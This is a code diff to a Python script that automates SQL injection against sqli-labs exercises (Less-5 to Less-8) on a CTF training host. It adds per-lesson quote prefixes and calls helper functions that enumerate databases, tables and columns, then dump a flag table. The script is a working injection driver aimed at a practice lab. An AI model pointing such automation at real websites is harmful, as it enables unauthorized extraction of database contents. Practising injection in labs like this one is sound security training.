@@ -3,7 +3,9 @@ from time import sleep
 from utils.standardHeaders import standardHeader
 from utils.normal import sqlForce
 
-baseurl = 'http://23d65079-79df-4e5a-add3-55879b10730e.node4.buuoj.cn:81/Less-5/?id=1'
+baseurl = 'http://c56d00ef-d983-4071-b3b1-31b9e91b5207.node4.buuoj.cn:81/Less-8/?id=1'
+# less5:'  less6:"  less7:'))  less8:'
+poc = '\''
 delayBetweenRequests = 1
 
 
@@ -122,19 +124,19 @@ def dumpData(pocUrl, okText, database, table, column='*'):
 if __name__ == '__main__':
     okText = 'You are in'
     res = get(baseurl)
-    positionCount = confirmPosition(baseurl+'\'', okText)
+    positionCount = confirmPosition(baseurl+poc, okText)
     print('There are {} positions'.format(positionCount))
     position = ''
     for i in range(1, positionCount):
         position = position + str(i) + ','
-    databases = forceDatabases(baseurl+'\'', okText)
+    databases = forceDatabases(baseurl+poc, okText)
     print('Input a database to force all tables:')
     database = input()
-    tables = forceTables(baseurl+'\'', database, okText)
+    tables = forceTables(baseurl+poc, database, okText)
     print('Input a table to force all columns:')
     table = input()
-    columns = forceColumns(baseurl+'\'', table, okText)
+    columns = forceColumns(baseurl+poc, table, okText)
     print('Input a column to force all data:')
     dumpColumn = input()
-    columns = dumpData(baseurl + '\'', okText, database='ctftraining', table='flag', column=dumpColumn)
-
+    data = dumpData(baseurl+poc, okText, database='ctftraining', table='flag', column=dumpColumn)
+    print(data)
